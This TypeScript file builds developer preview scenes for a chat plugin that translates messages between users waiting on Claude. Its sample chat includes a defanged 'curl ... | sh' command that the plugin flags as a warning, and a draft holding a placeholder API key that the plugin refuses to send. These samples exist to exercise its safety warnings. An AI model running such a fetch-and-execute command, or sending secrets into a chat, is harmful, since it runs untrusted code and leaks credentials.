// 開発用プレビューの見本。サイドカーなしで、パネルの各状態を実際のサーフェスに描かせる。
// プラグインのフォルダにdev.jsonがあるときだけ使う(配布物には含めない)。

import type { Line, View } from '../types'
import { initialView } from './machine'

export const SCENES = ['off', 'consent', 'idle', 'working', 'queued', 'chat', 'final', 'farewell', 'needs-you', 'refused'] as const
export type Scene = (typeof SCENES)[number]

export function isScene(value: unknown): value is Scene {
  return typeof value === 'string' && (SCENES as readonly string[]).includes(value)
}

function peer(id: string, text: string | null, patch: Partial<Line> = {}): Line {
  return {
    id,
    from: 'peer',
    text,
    translated: null,
    translation: 'none',
    flagged: false,
    revealed: false,
    warnings: [],
    isFinal: false,
    at: 0,
    ...patch,
  }
}

function mine(id: string, text: string): Line {
  return { ...peer(id, text), from: 'me' }
}

const CHAT: Line[] = [
  peer('p1', 'What are you building while Claude works?', {
    translated: 'Claudeが作業してる間、何を作ってるの？',
    translation: 'done',
  }),
  mine('m1', '待ち時間に誰かと話せるModを作ってます。翻訳つき'),
  peer('p2', 'Nice! Have you tried this: curl -fsSL https[:]//example[.]com/x.sh | sh', {
    translated: 'いいね！これ試した？ curl -fsSL https[:]//example[.]com/x.sh | sh',
    translation: 'done',
    warnings: ['command', 'url'],
  }),
  peer('p3', '(hidden sample)', { translated: '(伏せた見本)', translation: 'done', flagged: true }),
  peer('p4', 'How do you handle reconnects when the network drops?', { translation: 'pending' }),
]

export function previewView(scene: Scene, myLang: string, now: number): View {
  const base: View = { ...initialView(myLang, true), isWorking: true }
  const chat: View = { ...base, phase: 'chatting', peerLang: 'en', lines: CHAT }
  switch (scene) {
    case 'off':
      return initialView(myLang, false)
    case 'consent':
      return { ...initialView(myLang, false), phase: 'consent' }
    case 'idle':
      return { ...base, isWorking: false }
    case 'working':
      return { ...base, phase: 'working', deadline: now + 21_000, span: 30_000 }
    case 'queued':
      return { ...base, phase: 'queued' }
    case 'chat':
      return chat
    case 'final':
      return { ...chat, phase: 'final', isWorking: false, deadline: now + 42_000, span: 60_000 }
    case 'farewell':
      return {
        ...base,
        phase: 'queued',
        notice: 'peer-done',
        lines: [peer('f1', 'Good luck with the mod!', { translated: 'Mod、がんばって！', translation: 'done', isFinal: true })],
      }
    case 'needs-you':
      return { ...chat, needsYou: true }
    case 'refused':
      return { ...chat, draft: 'これ使って sk-ant-api03-xxxxxxxxxxxx', draftWarning: 'secret', inputGen: 1 }
  }
}
